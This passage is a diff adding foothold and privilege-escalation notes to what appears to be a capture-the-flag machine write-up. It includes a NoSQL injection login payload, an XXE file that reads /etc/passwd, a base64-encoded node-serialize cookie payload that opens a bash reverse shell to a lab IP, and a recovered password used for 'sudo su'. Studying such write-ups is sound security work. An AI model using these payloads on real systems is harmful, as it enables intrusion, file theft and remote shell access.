@@ -20,3 +20,59 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+---
+
+## Foothold
+
+- Login is vulnerable to NoSQL Injection, request body:
+
+```json
+{
+	"user":"admin",
+	"password": {
+		"$ne": "anything"
+	}
+}
+```
+
+- Upload XML is vulnerable to XXE
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+
+<post>
+<title>
+	&file;
+</title>
+<description>
+	Test
+</description>
+<markdown>
+	Test
+</markdown>
+</post>
+```
+
+- Got `/opt/blog/server.js`
+- Deserialization Attack: on cookie `auth=`:
+
+```json
+{"game":"_$$ND_FUNC$$_function(){require('child_process').exec('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDAgMD4mMQ==\" | base64 -d | bash', function(error, stdout, stderr){console.log(stdout)});}()"}
+```
+
+
+
+---
+
+## PrivEsc
+
+- mongo, use blog, db.users.find()
+- password is: `IppsecSaysPleaseSubscribe`
+- just `sudo su` as root.
+
+---
+
